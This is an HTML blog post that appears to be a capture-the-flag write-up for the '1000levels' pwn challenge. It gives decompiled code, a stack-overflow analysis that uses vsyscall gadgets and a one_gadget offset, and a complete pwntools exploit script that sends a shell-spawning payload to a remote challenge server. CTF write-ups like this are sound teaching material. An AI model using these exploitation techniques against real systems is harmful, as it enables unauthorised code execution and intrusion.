@@ -1,0 +1,203 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ADWorld PWN Challenge Area Write-ups (Advanced ROP) - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,This part is for special ROP tasks.
+1000levelsAttachment: 1000levevls.gzDescription: None
+It is rel,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="../../../.."></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ADWorld PWN Challenge Area Write-ups (Advanced ROP)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">ADWorld PWN Challenge Area Write-ups (Advanced ROP)</h1>
+        <div class="stuff">
+            <span>October 09, 2020</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctf/">ctf</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/linux/">linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/">pwn</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/rop/">rop</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/stack-overflow/">stack-overflow</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>This part is for special <code>ROP</code> tasks.</p>
+<h2 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h2><p>Attachment: <a href="/filehost/apcaw/1000levevls.gz">1000levevls.gz</a><br>Description: None</p>
+<p>It is related to <code>vsyscall</code> which only exists in old version <code>glibc</code>.</p>
+<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar xvf 1000levevls.gz</span><br><span class="line">100levels</span><br><span class="line">libc.so</span><br></pre></td></tr></table></figure></p>
+<p>Check:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ file 100levels</span><br><span class="line">100levels: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8293d0a04bff99850d490343e65e25d81b6b1966, stripped</span><br><span class="line">$ checksec 100levels</span><br><span class="line">[*] &apos;/root/100levels&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu7) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></p>
+<p>Pseudocode:<br><code>main</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  initial();</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = read_num();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      hint();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      go(a1, (__int64)a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a1 = (__int64)<span class="string">"Wrong input"</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong input"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_D92();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>hint</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+14h] [rbp-FCh]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v1, <span class="string">"Hint: %p\n"</span>, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = 'N NWP ON';</span><br><span class="line">    v2 = 'UF O';</span><br><span class="line">    v3 = <span class="string">'N'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>go</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">go</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many levels?"</span>);</span><br><span class="line">  v4 = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    v7 = v4;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Coward"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Any more?"</span>);</span><br><span class="line">  v5 = read_num();</span><br><span class="line">  v8 = v7 + v5;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You are being a real man."</span>);</span><br><span class="line">      v9 = <span class="number">100L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Let's go!'"</span>);</span><br><span class="line">    v6 = time(<span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(v9) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(<span class="number">0L</span>L);</span><br><span class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v10, <span class="string">"Great job! You finished %d levels in %d seconds\n"</span>, v9, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - v6), v5);</span><br><span class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You failed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Coward Coward Coward Coward Coward"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>and <code>level</code> in <code>go</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">level</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(a1 - <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v10 = rand() % a1;</span><br><span class="line">  v2 = rand();</span><br><span class="line">  v9 = v2 % a1;</span><br><span class="line">  v8 = v2 % a1 * v10;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===================================================="</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Level %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Question: %d * %d = ? Answer:"</span>, v10, v9);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v3 = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>From <code>read(0, &amp;buf, 0x400uLL);</code> in <code>level()</code> we can see it will overflow <code>__int64 buf; // [rsp+10h] [rbp-30h]</code>. However with <code>NX</code> and <code>PIE</code> enabled, <code>ROP</code> chains are hard to deal.</p>
+<p>There is a <code>hint()</code> which could leak <code>system</code> for us, but <code>unk_20208C</code> cannot be changed by us now, so is this func useless?</p>
+<p>No, now let’s see the assembly code:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000000D11                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:system_ptr</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D18                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_110], <span class="built_in">rax</span></span><br></pre></td></tr></table></figure></p>
+<p>Though it won’t be printed, the address of <code>system</code> is saved in <code>rbp+var_110</code> (<code>rbp-0x110</code> which is on the stack), and between the running of <code>hint()</code> and <code>go()</code>, the value of <code>rbp</code> remains the same, so the “leaked” <code>system</code> can be also found in <code>rbp-0x110</code> in func frame of <code>go()</code> (corresponding variable is <code>__int64 v7; // [rsp+10h] [rbp-110h]</code>).</p>
+<p>To keep <code>v7</code> unchanged, we have to first input a value less than or equal to 0, then we input <code>v5</code> and the number of <code>level</code> will be determined by <code>v8 = v7 + v5;</code>.</p>
+<p>We can surely use brute-force attack to identify the value of <code>v7</code>(<code>system</code> address). When <code>v5</code> is smaller than <code>-system_address</code>, we will receive <code>Coward Coward Coward Coward Coward</code>, while when <code>v5</code> is larger than <code>-system_address</code> we will enter the <code>level()</code>. You may notice that we always end up entering <code>level()</code>, so why not use stack overflow directly?</p>
+<p>The <code>level()</code> is called recursively, so only in the last <code>level()</code> can we use the shortest payload to reach <code>v7</code> in func frame of <code>go()</code>.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 v4; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">__int64 v5; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line"><span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">__int64 v7; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br></pre></td></tr></table></figure></p>
+<p>However still <code>0x10</code> needs to be overflowed. Now we think about how to exploit it, because we haven’t leaked any address but we need <code>ROP</code> gadget to fill the gap; besides the <code>system</code> address in <code>v7</code> needs an argument <code>/bin/sh</code> to be effective.</p>
+<p>First we deal with the <code>ROP</code> gadgets issue.<br>We use <code>vsyscall</code>(virtual system call) because it has fixed address even with <code>ASLR</code> on and <code>PIE</code> enabled. It is the first and oldest mechanism in the Linux kernel that is designed to accelerate execution of certain system calls. The principle of work of the vsyscall concept is: The Linux kernel maps into user space a page that contains some variables and the implementation of some system calls.<br><img src="/imghost/apcaw/vsyscall.png" alt="vsyscall.png"><br>It is dumped from <code>gdb</code> and viewed in<code>IDA</code>. There are three <code>syscalls</code>: <code>gettimeofday</code>, <code>time</code> and <code>getcpu</code> (starts at <code>0xffffffffff600000</code>, <code>0xffffffffff600400</code> and <code>0xffffffffff600800</code>).<br>We can use these 3 functions as gadgets.</p>
+<p>Next we have to think about how to use <code>system</code> in <code>v7</code>. Since we cannot get exact address of <code>pop rdi; ret</code>, it’s better to use <code>one gadget</code> because the offset between <code>system</code> and <code>one gadget</code> is fixed, so setting an appropriate <code>v5</code> can change <code>v7</code> to be address of <code>one gadget</code>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget  libc.so</span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure></p>
+<p>We choose <code>0x4526a</code> because <code>gettimeofday</code>, <code>time</code> and <code>getcpu</code> can keep [rsp+0x30] == NULL (<code>0xef6c4</code> and <code>0xf0567</code> are hard to satisfy).<br>Then let us see exploit.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We have to write <code>answer()</code> to answer questions automatically because only the last round of <code>level()</code> will be our best chance to send payload. It means we will wait for a long time every time we run this script.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = process(<span class="string">'100levels'</span>)</span><br><span class="line">sh = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'45100'</span>)</span><br><span class="line">elf = ELF(<span class="string">'100levels'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">vsyscall_gettimeofday = <span class="number">0xffffffffff600000</span></span><br><span class="line">vsyscall_time = <span class="number">0xffffffffff600400</span></span><br><span class="line">vsyscall_getcpu = <span class="number">0xffffffffff600800</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">()</span>:</span></span><br><span class="line">        sh.recvuntil(<span class="string">'Question: '</span>) </span><br><span class="line">        answer = eval(sh.recvuntil(<span class="string">'='</span>)[:<span class="number">-1</span>])</span><br><span class="line">        sh.recvuntil(<span class="string">'Answer:'</span>)</span><br><span class="line">        sh.sendline(str(answer))</span><br><span class="line"></span><br><span class="line">sh.recv() <span class="comment"># menu</span></span><br><span class="line">sh.sendline(<span class="string">'2'</span>) <span class="comment"># hint</span></span><br><span class="line">sh.recv() <span class="comment"># menu</span></span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recv() <span class="comment"># How many levels?</span></span><br><span class="line">sh.sendline(<span class="string">'0'</span>) <span class="comment"># '&lt;=0' to not overwrite system_addr </span></span><br><span class="line">sh.recv() <span class="comment"># Coward\nAny more?\n</span></span><br><span class="line">sh.sendline(<span class="string">'-294'</span>) <span class="comment"># 0x4526a from one_gadget</span></span><br><span class="line"><span class="comment"># sh.sendline('697140') # 0xef6c4</span></span><br><span class="line"><span class="comment"># sh.sendline('700887') # 0xf0567</span></span><br><span class="line">sh.recv() <span class="comment"># You are being a real man.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">        log.info(i)</span><br><span class="line">        answer()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x38</span> + p64(vsyscall_gettimeofday) *<span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recv()</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1000levels"><span class="toc-number">1.</span> <span class="toc-text">1000levels</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Information"><span class="toc-number">1.1.</span> <span class="toc-text">Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analysis"><span class="toc-number">1.2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
